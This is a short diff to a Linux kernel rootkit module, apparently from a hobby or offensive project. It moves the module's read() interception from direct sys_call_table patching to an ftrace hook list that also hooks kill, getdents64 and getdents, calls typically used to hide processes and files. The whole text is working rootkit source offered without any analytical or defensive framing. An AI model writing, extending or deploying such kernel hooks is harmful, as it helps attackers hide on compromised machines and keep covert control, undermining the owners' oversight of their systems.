@@ -272,6 +272,7 @@ void hideme(void)
 
 
 static struct ftrace_hook hooks[] = {
+	HOOK("__x64_sys_read", new_read, &orig_read),
 	HOOK("__x64_sys_kill", new_kill, &orig_kill),
 	HOOK("__x64_sys_getdents64", new_getdents64, &orig_getdents64),
     	HOOK("__x64_sys_getdents", new_getdents, &orig_getdents),
@@ -290,10 +291,6 @@ unsigned long lookup_by_name(const char *name){
 
 static int __init rootkit_init(void)
 {
-	__sys_call_table = (unsigned long *) kaddr_lookup_name("sys_call_table");
-	orig_read = (orig_read_t)__sys_call_table[__NR_read];
-	__sys_call_table[__NR_read] = (unsigned long)new_read;
-	printk("rootkit: hook read\n");*/
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err)
 		return err;
@@ -305,7 +302,6 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-	__sys_call_table[__NR_read] = (unsigned long)orig_read;
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
